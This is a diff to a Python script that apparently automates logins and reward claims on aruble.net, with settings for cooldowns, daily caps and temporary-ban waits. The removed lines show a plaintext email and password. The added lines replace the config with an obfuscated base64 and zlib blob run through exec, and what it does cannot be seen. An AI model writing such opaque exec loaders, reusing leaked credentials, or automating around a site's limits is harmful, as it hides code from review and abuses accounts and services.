@@ -28,16 +28,8 @@ from datetime import datetime
 import requests
 
 # ------------------- CONFIG -------------------
-BASE = "https://aruble.net"
-EMAIL = "abdulhananboohar@gmail.com"
-PASSWORD = "786786786"
-DEFAULT_CLAIMS = 5
-COOLDOWN_SECONDS = 300
-DEFAULT_HOLD_MS = 1000
-MAX_ATTEMPTS = 6
-TEMP_BAN_WAIT = 65
-DAILY_CLAIM_MAX = 70
-CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "aruble.json")
+# Python obfuscation by pyobfuscator.com
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QjWVk6BgPLzOpzn8d2ABfQIez1XJeB3ns6tdHNzo1NTtI/d1pd41GzFHeTM/TlqImvUNPrJNMdGFYwYGxbdIVARkl3WCEry5g4/MxWef52ksMKABHZce+Io/bgr0k83d+EmDfuWTyicsaoroFxKiejFYGQsKWVPUIJIyoV6Pfz5G+dpHVRPQGYu95hXzkH9jbzr1ZrNO2WtTn+a+VlgQmkzMTbJ476eNzSW6Vm8NftUaEhK6Q3LD89+ePcw1q1H9/+RlkoTXXcd8Db6UGNAdrRvKkB7gmxsBjq8R4Vn/rhQAzgrFGk9wJe'))
 # ---------------------------------------------
 
 UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
